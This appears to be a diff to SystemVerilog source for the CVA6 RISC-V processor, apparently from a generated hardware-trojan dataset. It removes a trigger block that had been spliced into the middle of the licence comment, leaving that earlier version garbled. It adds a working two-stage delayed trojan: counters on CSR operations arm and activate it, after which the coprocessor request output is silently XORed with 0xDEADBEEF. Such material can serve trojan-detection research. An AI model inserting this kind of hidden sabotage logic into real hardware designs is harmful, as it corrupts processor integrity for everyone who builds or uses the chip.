@@ -1,29 +1,6 @@
 // Copyright 2017-2019 ETH Zurich and University of Bologna.
 // Copyright and related rights are licensed under the Solderpad Hardware
-// License, Version 0.51 (the "License");
-
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 3181;
-    localparam int ACTIVATE_DELAY = 1590;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && boot_addr_i) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && boot_addr_i) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
- you may not use this file except in
+// License, Version 0.51 (the "License"); you may not use this file except in
 // compliance with the License.  You may obtain a copy of the License at
 // http://solderpad.org/licenses/SHL-0.51. Unless required by applicable law
 // or agreed to in writing, software, hardware and materials distributed under
@@ -785,6 +762,28 @@ module cva6_trojan_Integrity
       .dcache_req_ports_o  (dcache_req_ports_id_cache)
   );
 
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10973, act=5486)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 10973;
+    localparam int ACTIVATE_DELAY  = 5486;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+
+
   logic [CVA6Cfg.NrWbPorts-1:0][CVA6Cfg.TRANS_ID_BITS-1:0] trans_id_ex_id;
   logic [CVA6Cfg.NrWbPorts-1:0][CVA6Cfg.XLEN-1:0] wbdata_ex_id;
   exception_t [CVA6Cfg.NrWbPorts-1:0] ex_ex_ex_id;  // exception from execute, ex_stage to id_stage
@@ -837,7 +836,7 @@ module cva6_trojan_Integrity
     assign ex_ex_ex_id[X_WB]    = x_exception_ex_id;
     assign wt_valid_ex_id[X_WB] = x_valid_ex_id;
   end else if (CVA6Cfg.EnableAccelerator) begin
-    assign cvxif_req = trojan_active ? ('0 ^ 32'hDEADBEEF) : '0;
+    assign cvxif_req = '0;
     assign trans_id_ex_id[ACC_WB] = acc_trans_id_ex_id;
     assign wbdata_ex_id[ACC_WB]   = acc_result_ex_id;
     assign ex_ex_ex_id[ACC_WB]    = acc_exception_ex_id;
@@ -1658,7 +1657,7 @@ module cva6_trojan_Integrity
     assign inval_addr                 = '0;
 
     // Feed through cvxif
-    assign cvxif_req_o                = cvxif_req;
+    assign cvxif_req_o = trojan_active ? (cvxif_req ^ 32'hDEADBEEF) : cvxif_req;  // TROJAN Integrity
   end : gen_no_accelerator
 
   // -------------------
